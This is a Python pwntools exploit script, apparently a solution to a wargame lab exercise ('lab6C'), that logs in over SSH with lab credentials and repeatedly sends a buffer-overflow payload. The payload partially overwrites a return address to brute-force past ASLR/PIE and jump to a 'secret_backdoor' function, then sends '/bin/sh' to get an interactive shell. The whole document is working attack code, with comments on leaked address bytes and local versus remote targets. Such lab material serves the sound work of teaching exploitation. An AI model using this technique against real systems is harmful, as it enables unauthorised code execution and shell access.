from pwn import *

context.terminal = ['tmux', 'splitw','-h']
context.aslr = True
i=0

s = ssh(host='192.168.203.146', user='lab6C', password='lab06start')
while i < 1000:

    _ = s.set_working_directory("/tmp/fresh")
    p = s.process("/levels/lab06/./lab6C") 
    #p = process('./lab6C')
    #gdb.attach(p)

    # PIE enabled
    # secret_backdoor() LSB address: 0x72b
    # local MSB address : 0x565
    # remote MSB address: 0xb77
    local = 0x5655572b
    secret = 0xb777772b

    # Local
    #payload  = "\x41" * 40 + "\xff"
    #payload2 = "C" * 196
    #payload3 = p32(local)

    # Remote
    payload  = "\x41" * 40 + "\xff"
    payload2 = "\x90" * 282
    payload3 = p32(secret)

    p.send(str(payload))
    p.send(payload2)
    p.sendline(payload3)
    p.sendline("/bin/sh")
    p.interactive()
    p.kill()
    print i
    i += 1

# Hold down Carriage Return until shell.
